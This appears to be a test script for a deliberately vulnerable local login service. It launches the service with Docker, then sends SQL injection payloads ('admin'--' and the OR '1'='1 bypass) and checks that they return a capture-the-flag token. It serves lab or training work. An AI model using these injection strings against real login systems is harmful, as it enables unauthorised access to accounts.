#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d
trap "$DC down" EXIT
sleep 3

# 1. Normal login with wrong password: should fail
OUT=$(curl -sf -X POST "http://localhost:8080/login" \
  -d "username=admin&password=wrongpassword")
if echo "$OUT" | grep -qE '"success": false'; then
  echo "[+] PASS: wrong password rejected"
else
  echo "[-] FAIL: wrong password should not succeed"; echo "$OUT"; exit 1
fi

# 2. SQL comment injection: should bypass password and return flag
OUT=$(curl -sf -X POST "http://localhost:8080/login" \
  --data-urlencode "username=admin'--" \
  --data-urlencode "password=anything")
if echo "$OUT" | grep -qE 'POC\{[0-9a-f]{32}\}'; then
  echo "[+] PASS: SQL comment injection returned flag"
else
  echo "[-] FAIL (comment injection): $OUT"; exit 1
fi

# 3. OR-based injection: 1=1 bypass
OUT=$(curl -sf -X POST "http://localhost:8080/login" \
  --data-urlencode "username=' OR '1'='1" \
  --data-urlencode "password=' OR '1'='1")
if echo "$OUT" | grep -qE 'POC\{[0-9a-f]{32}\}'; then
  echo "[+] PASS: OR injection returned flag"
else
  echo "[-] FAIL (OR injection): $OUT"; exit 1
fi

echo "[+] All tests passed"
